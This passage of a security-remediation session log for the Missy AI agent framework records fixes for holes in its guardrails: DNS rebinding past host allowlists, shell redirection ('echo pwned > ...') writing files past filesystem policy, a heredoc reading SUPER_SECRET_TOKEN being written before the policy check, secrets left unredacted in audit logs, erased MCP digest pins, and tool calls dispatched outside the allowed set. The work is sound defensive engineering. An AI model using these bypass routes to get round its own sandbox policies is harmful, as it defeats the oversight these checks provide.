`### SR-1.4` section.

### Completed This Session, continued: SR-1.9a (network policy allowlisted-host DNS-rebinding gap)

`NetworkPolicyEngine.check_host()`'s exact-hostname match (`allowed_hosts`)
and domain-suffix match (`allowed_domains`) returned `allow` immediately
with zero IP verification — the DNS-rebinding defense (deny if a
resolved address is private/loopback/link-local and not covered by
`allowed_cidrs`) only ran for hostnames matching *neither* list. Two
pre-existing tests explicitly asserted this as correct
(`test_exact_host_match_does_not_call_dns`,
`test_domain_match_does_not_call_dns`), the same "vulnerable behavior
encoded as a passing test" pattern found in SR-1.8. Live-reproduced with
a fake resolver configured to raise `AssertionError` if ever called:
`check_host("build.corp.example.com")` with that host allowlisted
returned `True` **without the resolver ever being invoked** — proving
an allowlisted hostname whose DNS now points at internal infrastructure
would connect with zero verification.

Fixed by extracting the existing rebinding-check logic into a shared
`_resolve_and_check_rebinding()` helper and applying it uniformly to
the name-match steps too, not just the no-match fallback. A hostname
that fails to resolve entirely is still allowed (nothing to rebind if
there's no live DNS record), preserving prior behavior for such names.

**Caught and fixed a real test-suite performance regression from this
fix in the same checkpoint:** six Hypothesis property tests in
`tests/policy/test_policy_property.py` generate random hostnames as
allowlist entries without mocking DNS — previously fine since matched
hosts never called DNS, but after this fix each took a real, unmocked
`getaddrinfo()` hit per example (up to 100 examples/test), pushing
`tests/policy/`+`tests/gateway/`+`tests/security/` from ~76s to ~380s.
Fixed by mocking DNS to raise `OSError` in those six tests, matching
the pattern this same file already used correctly for its deny-path
tests; runtime returned to ~69s with the same 3040 tests passing.

Full detail and residual risk (sub-finding (b), the harder
policy-check-vs-connect-time DNS TOCTOU requiring attacker-controlled
low-TTL DNS, remains open and out of scope) in `AUDIT_SECURITY.md`'s
new `### SR-1.9a` section.

### Completed This Session, continued: SR-1.7 (shell redirection bypassed the filesystem policy — tenth critical finding)

`ShellPolicyEngine.check_command()` only ever validated program names;
redirection operators (`>`, `>>`, `<`, etc.) were never parsed or routed
through `FilesystemPolicyEngine` at all. Live-reproduced through the
real, unmocked production `shell_exec` tool via `ToolRegistry` — not a
theoretical gap: with only `"echo"` allowlisted and
`allowed_write_paths` completely empty,
`shell_exec(command="echo pwned > /tmp/.../not_allowed/pwn.txt")`
returned `success: True` and **the file was genuinely created on disk**
with content `"pwned"` — an unrestricted arbitrary-file-write primitive
available through any config permitting even one innocuous command.

Fixed: added `ShellPolicyEngine.extract_redirect_targets()`, tokenising
with POSIX-punctuation-aware `shlex` so operators are recognised with or
without surrounding whitespace (`echo x>file` closes an obvious
naive-scanner dodge), correctly excluding fd-duplication forms (`2>&1`,
`>&2`). `PolicyEngine.check_shell()` now routes every extracted target
through `filesystem.check_write()`/`check_read()` after the program-name
check passes. Live-verified the exact reproduction above is now denied
and the file is never created; a matching request with the path
allowlisted passes cleanly. 25 new tests across
`tests/policy/test_shell.py` and `tests/policy/test_engine.py`.

**Bug found and fixed in the same checkpoint** (directly in the code
this work touches, not itself a security finding): the chain-operator
splitting regex treated `&` in `2>&1`/`>&2`/`<&0` as the
background-execution operator, splitting `"echo hi 2>&1"` into fake
sub-commands and denying the extremely common `2>&1` idiom outright even
with `echo` correctly allowlisted. Confirmed pre-existing via `git
stash`. Fixed with a negative lookbehind; genuine background `&`
splitting is unaffected.

This is the tenth independent, confirmed critical finding this session.

Full detail and residual risk (the launcher sub-finding —
`find`/`xargs`/`bash`/`sudo` etc. remaining allowlist-able with only a
warning, and nested shell commands inside a launcher's quoted arguments
being structurally invisible to any static command-string parser — is a
separate product-policy question, not addressed here) in
`AUDIT_SECURITY.md`'s new `### SR-1.7` section.

### Completed This Session, continued: SR-1.10 (audit sink wrote secrets to disk unredacted — eleventh critical finding)

Every audit event's `detail` dict was serialized to
`~/.missy/audit.jsonl` completely verbatim, with no redaction of any
kind, regardless of which subsystem published it. `api/audit_browser.py`
only redacts when *rendering* events for the Web TUI — a cosmetic
display-time filter that cannot undo what's already on disk, exactly
the review's point ("a storage leak the viewer can't repair").
Live-reproduced: publishing an audit event with a realistic
Anthropic-shaped bearer token in a header, an AWS presigned-URL
signature in an error string, and a Google-API-key-shaped value in a
URL query string resulted in **all three appearing in plaintext** in
the on-disk JSONL file.

Fixed: added `_redact_detail()` (`missy/observability/audit_logger.py`),
a small recursive walker applying the existing
`missy.security.censor.censor_response()` to every string leaf of a
`detail` structure, wired into `AuditLogger._handle_event()` — the
single choke point every published event passes through before being
written — so this covers every publisher uniformly. Also added the two
token-shape patterns the review named as gaps in the same breath as
this finding: `bearer_token`, `basic_auth_header`, and
`aws_presigned_signature` (`SecretsDetector.SECRET_PATTERNS`, 50→53).
Live-verified the three-secret reproduction above now redacts all three
on disk; confirmed a correctly-shaped Google API key is caught by its
existing content-shape pattern regardless of context. 6 new tests in
`tests/observability/test_audit_logger.py`; 2 pre-existing tests
hardcoding the pattern count updated from 50 to 53.

This is the eleventh independent, confirmed critical finding this
session.

**Unrelated pre-existing flake noticed during this checkpoint's full
suite run (not caused by any of today's changes):**
`tests/security/test_property_based_fuzz.py::TestNetworkPolicyEngineFuzz::test_check_host_never_crashes_on_arbitrary_unicode`
intermittently fails with `hypothesis.errors.DeadlineExceeded` — it has
no `deadline=None` and no DNS mock, so an occasional slow live
`socket.getaddrinfo()` call trips Hypothesis's default 200ms deadline.
Confirmed via `git show HEAD~5` that this test file is unmodified by
any commit this session and always uses empty `allowed_hosts`/
`allowed_domains` (so it never touches SR-1.9a's changed code paths,
which only affect the `allowed_hosts`/`allowed_domains` match steps) —
re-running it in isolation reproduces the same intermittent pass/fail
pattern regardless of branch state. Not fixed this session (same
category as the already-tracked vision `CameraDiscovery` flake, task
#11); the full-suite run for this checkpoint passed clean on the
following attempt.

Full detail and residual risk (only the two explicitly-named token
shapes were closed; a general "any query param literally named
`key`/`token` is a secret" pattern was deliberately not added due to
false-positive risk) in `AUDIT_SECURITY.md`'s new `### SR-1.10` section.

### Completed This Session, continued: SR-1.11 (MCP manifest digest pinning self-destructs on reconnect — twelfth critical finding)

`McpManager.add_server()` calls `_save_config()` unconditionally after
every successful connect, including reconnects; `_save_config()`
rebuilt every config entry purely from `self._clients`
(`name`/`command`/`url`), silently dropping any `digest` field. `missy
mcp pin <name>` correctly writes a digest, but the very next ordinary
`McpManager` restart erases it — no attacker interaction needed.
Live-reproduced end-to-end: pinned a server's digest, simulated a
process restart via `connect_all()` on a fresh `McpManager` reading the
same config file — the `digest` key was completely gone afterward. A
second reproduction confirmed the consequence: with the pin erased,
`add_server()`'s digest check is silently skipped entirely, so a
tampered MCP server's tool manifest would connect successfully with no
error, warning, or audit signal that protection had quietly stopped
applying.

Fixed: `_save_config()` now reads the existing on-disk config first (if
present) to recover each server's currently pinned digest and merges it
back into the freshly rebuilt entries before writing, regardless of
what triggered the rewrite. Live-verified: the digest survives one
reconnect cycle, three repeated reconnect cycles, and — critically —
remains functionally effective: a tampered manifest presented after a
clean reconnect cycle is still correctly denied. Also verified digests
for multiple independently-pinned servers all survive an unrelated
server's `_save_config()` trigger, and that missing/corrupt on-disk
config degrades gracefully. 7 new tests in
`tests/mcp/test_manager_edges.py::TestSaveConfigPreservesDigest`.

This is the twelfth independent, confirmed critical finding this
session.

Full detail and residual risk (the digest itself still only covers
tool `name`+`description`, not `inputSchema`/annotations — a separate,
narrower gap this checkpoint does not address) in
`AUDIT_SECURITY.md`'s new `### SR-1.11` section.

### Completed This Session, continued: SR-2.4 (heredoc rewrite wrote model code to disk before policy approval — thirteenth critical finding, first §2 item)

First finding addressed from the review's §2 (unattended-execution
hazards). `_rewrite_heredoc_command()` (`missy/agent/runtime.py`)
extracted a heredoc body from a model-supplied `shell_exec` command and
wrote it to a real temp file — *before* the shell policy check, which
only happens later inside `registry.execute()`. No interpreter
allowlist check of any kind existed in this function. Live-reproduced:
calling it with a heredoc body reading `SUPER_SECRET_TOKEN` from the
environment wrote the full script to `/tmp/missy_heredoc_*.py`
unconditionally, regardless of whether `"python3"` would ever be
permitted to execute. The file was also never deleted after use — a
related defect the review names in the same finding.

Fixed: the interpreter is now checked against the real shell policy
(reusing SR-1.7's uniform check) *before* anything is written. If
denied (or the policy engine isn't initialised), the function returns
the original heredoc-laden command unmodified, which then reaches
`registry.execute()` and is denied there normally — zero disk
footprint. When permitted, the temp file path is now returned to the
caller, which wraps the tool-dispatch retry loop in a `try/finally`
that unconditionally deletes it once the tool call finishes (success,
failure, or retries exhausted). Live-verified the exact
`SUPER_SECRET_TOKEN` reproduction: with `"python3"` not allowlisted,
zero new files appear on disk at any point.

4 new tests in
`tests/agent/test_runtime_config_edges.py::TestRewriteHeredocCommandPolicyGate`;
~20 pre-existing heredoc-rewrite tests updated for the new
`(tool_args, tmppath)` return signature and given a real policy-engine
fixture so they continue to exercise genuine rewrite behavior.

This is the thirteenth independent, confirmed critical finding this
session.

Full detail and residual risk (this closes the specific mechanism
named by the review; a full audit for the same "write-then-check"
ordering across all other built-in tools was not performed) in
`AUDIT_SECURITY.md`'s new `### SR-2.4` section.

### Completed This Session, continued: SR-2.3 (execution-time tool allow-set not revalidated at dispatch — fourteenth critical finding)

`_tool_loop()` computes the per-turn visible tool set exactly once via
`_get_tools()` (which resolves `capability_mode` +
`tool_policy`/`agent_tool_policy`/`group_tool_policy`) and presents
that list to the provider — but `_execute_tool()`, the function that
actually dispatches every tool call the model returns, looked up the
name directly in the live `ToolRegistry` with **no check whatsoever**
against the resolved per-turn set. Live-reproduced end-to-end against
real `AgentRuntime`/`_get_tools()`/`_execute_tool()` code: with
`capability_mode="safe-chat"`, `_get_tools()` correctly excluded
`shell_exec` from the visible set, yet calling `_execute_tool()`
directly with a `shell_exec` call still dispatched to
`registry.execute("shell_exec", ...)` and returned success — a
hallucinated, stale, or provider-ignored-the-function-list tool name
would silently bypass the capability-mode/tool-policy layer entirely.

Fixed: `_tool_loop()` now computes `allowed_tool_names` from the exact
`tools` list it resolved and hands it to every `_execute_tool()` call
for that turn; `_execute_tool()` refuses any name outside that set
before the registry is ever consulted, emitting a `tool_execute`/`deny`
audit event. `None` (default) skips the check, preserving exact prior
behavior for call sites without a resolved per-turn set. Live-verified
the exact reproduction now returns `is_error=True` with `registry.execute`
confirmed never invoked. 6 new tests in
`tests/agent/test_coverage_gaps.py::TestRuntimeExecuteToolAllowSet`,
including one exercising the full `_tool_loop()` → `_execute_tool()`
wiring end-to-end; 3 pre-existing tests updated for the new kwarg.

This is the fourteenth independent, confirmed critical finding this
session.

Full detail and residual risk (mid-loop policy hot-reload revalidation
is a narrower, separate scenario not specifically targeted by this fix)
in `AUDIT_SECURITY.md`'s new `### SR-2.3` section.

### Known Pre-Existing Failure (not caused by this session)

`tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl`
and two related cases in `tests/vision/test_discovery_edge_cases.py`
fail on a clean checkout before any of this session's changes
(confirmed via `git stash`): `CameraDiscovery`'s cache-TTL logic doesn't
suppress a rescan within the TTL window when a new sysfs entry appears
between calls. Needs investigation in `missy/vision/discovery.py`.
Tracked as a separate task; not fixed in this session to keep commits
scoped to FX-A / voice-command work.

### Remaining Work (priority order per prompt.md)

1. FX-B: wire real Discord → `SQLiteMemoryStore` persistence + integration
   tests; rerun `MEM-001`, `MEM-004`, `SEC-PI-004`, `XT-006`.
2. FX-D/FX-E: independent-grading enforcement beyond the acpx envelope
   (never trust self-authored scorecards elsewhere in the codebase);
   core safety instruction for gated-tool-unavailable fallback paths
   (no bypass suggestions).
3. FX-C: done-criteria/runtime verification for mid-task claims; fix
   `memory_describe`/`memory_expand`; preserve structured Incus output.
4. FX-F: browser diagnostics + disposable sandboxed Playwright test
   environment.
5. FX-G: bounded/decomposed long acpx work with per-step deadlines.
6. SR-1.1 through SR-4.8 security-review remediation
   (`~/Missy-security-review.md`, pinned at commit `abb7015`).
7. Full 89-case tool-specific validation backlog.
8. Pre-existing vision cache-TTL flake (tracked above).

### Blockers

None. Real `acpx@0.3.1` binary is installed and usable for health-check
verification; live delegate invocations (actual LLM calls through acpx)
have not yet been exercised end-to-end in this session — that requires
careful cost/scope control and is the next major slice of FX-A bullet 6
and the validation backlog.

---

## Prior Workstream: Tool Intelligence Overhaul (complete, preserved for history)

Completed 2026-07-09. Missy has request-pattern tracking, conservative
candidate generation, candidate lifecycle storage, benchmark harnesses,
benchmark-to-candidate reconciliation, provider-specific gates, CLI
diagnostics, Web/API review controls, and an opt-in controlled runtime
loader for enabled candidates (`missy/tools/intelligence/candidate_loader.py`,
`CandidateRuntimeLoader`, `CandidateDelegatedTool`). Gated by
`tool_intelligence.candidate_runtime.enabled` (default `false`). See
git history (`47fa1b2` and earlier) for full detail; superseded as the
active focus by the validation-harness overhaul above.
